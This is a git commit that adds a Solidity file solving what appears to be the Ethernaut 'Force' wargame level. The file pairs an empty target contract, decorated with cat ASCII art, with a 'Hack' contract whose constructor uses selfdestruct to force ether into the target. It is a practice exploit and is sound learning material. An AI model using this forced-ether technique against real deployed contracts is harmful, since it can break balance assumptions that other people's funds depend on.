486409012b5187ebf5db7912ca25d3d3cad83e21
lopeselio <lopeselio@gmail.com>
2023-01-23 16:59:39 +0530

    force

---
+++ Force/Force.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+contract Hack {
+    constructor(address payable _target) payable {
+        selfdestruct(_target);
+    }
+}
